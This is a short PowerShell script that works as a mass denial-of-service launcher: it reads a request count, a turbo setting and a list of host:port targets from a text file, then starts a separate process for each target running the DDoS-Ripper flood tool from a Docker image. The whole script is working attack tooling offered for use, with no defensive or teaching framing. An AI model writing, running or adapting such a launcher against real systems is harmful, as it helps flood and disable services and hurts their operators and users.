$regex = "#.*";
$FileName = ".\commands\ddos-ripper_commands.txt"

$NumberOfParameters = 2;

$Requests = Get-Content $FileName | Where-Object {-not ($_ -match $regex)} | Select-Object -First 1;
$Turbo = Get-Content $FileName | Where-Object {-not ($_ -match $regex)} | Select-Object -Skip 1  | Select-Object -First 1;

$Part1 = "docker run --rm -i --entrypoint python3 nitupkcuf/ddos-ripper:latest -u DRipper.py -s ";
$Part2 = " -t " + $Turbo + " -p ";

Get-Content $FileName | Where-Object {-not ($_ -match $regex)} | Select-Object -Skip $NumberOfParameters | ForEach-Object {
	$Target = $_.replace(' ', '').Split(':');
	Start-Process powershell ($Part1 + $Target[0] + $Part2 + $Target[1]);
}
